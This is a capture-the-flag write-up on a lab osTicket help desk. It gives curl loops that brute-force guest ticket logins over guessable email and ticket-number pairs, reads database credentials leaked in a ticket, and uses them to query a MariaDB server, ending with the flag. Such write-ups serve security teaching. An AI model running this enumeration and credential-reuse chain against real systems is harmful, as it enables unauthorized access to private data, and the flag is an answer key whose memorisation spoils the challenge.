#### Challenge:

Hi Senior Researcher,

we suspect that some of the systems used in our daily operations are allowing sensitive information to leak to competing research organizations. Your task is to determine whether the help desk's ticket management system is secure and no data are in danger.

Stay curious!

Ticket System is available on http://ticket.nren.tcc.

---

#### Solution:

The target is **osTicket** (`Server: Apache/2.4.67`, `X-Powered-By: PHP/8.4.22`, `OSTSESSID`
cookie). The asset cache-buster `?2570d69` pins the exact build: *osTicket v1.18-git, commit
`2570d69`* — the version vulnerable to the 06/2026 ticket-field BOLA/IDOR (CVE-2026-14871). That
CVE, however, needs an authenticated agent; the actual data leak here is reachable with no account
at all.

- Read the flavor text in the **Knowledgebase**. `kb/faq.php?id=2` ("How to check a ticket status?")
  gives the whole attack surface away: *"Fill in your email address (name@nren.tcc format) and your
  ticket number (should be a number between 1 – 10)."* So ticket numbers are the sequential integers
  **1–10** and users are `<name>@nren.tcc`. FAQ 4/5 name real users: **Dmitri** and **Eve**.

```bash
# Fingerprint + harvest hints
curl -s http://ticket.nren.tcc/ | grep -i osticket
for id in 1 2 4 5; do curl -s "http://ticket.nren.tcc/kb/faq.php?id=$id"; done \
  | sed 's/<[^>]*>/ /g' | grep -iE 'ticket number|nren.tcc|Dmitri|Eve'
```

- The **"Check Ticket Status"** form on `view.php` actually POSTs to `login.php` with
  `lemail` + `lticket` (+ `__CSRFToken__`). osTicket grants a guest ticket session on a matching
  `email`/`ticket#` pair — and with numbers constrained to 1–10 and guessable `name@nren.tcc`
  addresses, any "competitor" can walk straight into other people's tickets. A correct pair returns
  **HTTP 302 → tickets.php**; everything else returns the form with *"Access denied"*.
  Note: osTicket rotates the CSRF token per request, so fetch a fresh token for each attempt.

```bash
# Brute the small (name x ticket#) space; a 302 == valid, readable ticket
for n in dmitri eve jane kevin alice bob; do
  for t in $(seq 1 10); do
    rm -f c.txt
    CSRF=$(curl -s -c c.txt http://ticket.nren.tcc/view.php \
            | grep -oE 'content="[a-f0-9]{20,}' | grep -oE '[a-f0-9]{20,}' | head -1)
    code=$(curl -s -b c.txt -c c.txt -o /dev/null -w '%{http_code}' \
            http://ticket.nren.tcc/login.php \
            --data-urlencode "__CSRFToken__=$CSRF" \
            --data-urlencode "lemail=$n@nren.tcc" --data-urlencode "lticket=$t")
    [ "$code" = 302 ] && echo "HIT $n@nren.tcc ticket=$t"
  done
done
# -> HIT eve@nren.tcc ticket=2 / HIT dmitri@nren.tcc ticket=3 / HIT dmitri@nren.tcc ticket=4
```

- Reading the accessible tickets, **ticket #3** ("New database", opened by Dmitri) is the leak:
  agent *Kevin IT* pastes live **database credentials** straight into the reply.

```bash
# Log in to ticket #3 and dump the thread
rm -f j.txt
CSRF=$(curl -s -c j.txt http://ticket.nren.tcc/view.php \
        | grep -oE 'content="[a-f0-9]{20,}' | grep -oE '[a-f0-9]{20,}' | head -1)
curl -s -b j.txt -c j.txt http://ticket.nren.tcc/login.php \
     --data-urlencode "__CSRFToken__=$CSRF" \
     --data-urlencode "lemail=dmitri@nren.tcc" --data-urlencode "lticket=3" -o /dev/null
curl -s -b j.txt http://ticket.nren.tcc/tickets.php | sed 's/<[^>]*>/ /g' | tr -s ' '
# ...Kevin IT: "database server: db.nren.tcc  database: crmtest  user: crmtest  pass: LearnHowToOptimize"
```

- Those are exactly the "sensitive information leaking to competitors". `db.nren.tcc` is reachable
  on the VPN (MariaDB, TCP/3306). Connect with the leaked creds and read the planted secret.

```bash
python3 -m venv .venv && ./.venv/bin/pip install -q pymysql
./.venv/bin/python - <<'PY' | grep -oE 'FLAG\{[^}]*\}'
import pymysql
c = pymysql.connect(host='db.nren.tcc', user='crmtest',
                    password='LearnHowToOptimize', database='crmtest')
cur = c.cursor(); cur.execute("SELECT secret FROM secrets"); print(cur.fetchone()[0])
PY
# -> FLAG{BZPL-lZ0x-JkZH-gVoD}
```

The ticket system is **not** secure: unauthenticated ticket-status lookups over a tiny, guessable
`(email, ticket#)` space expose internal tickets, one of which hands out production DB credentials
that a competitor can use to read confidential data.

---

<details><summary>FLAG:</summary>

```
FLAG{BZPL-lZ0x-JkZH-gVoD}
```

</details>
<br/>
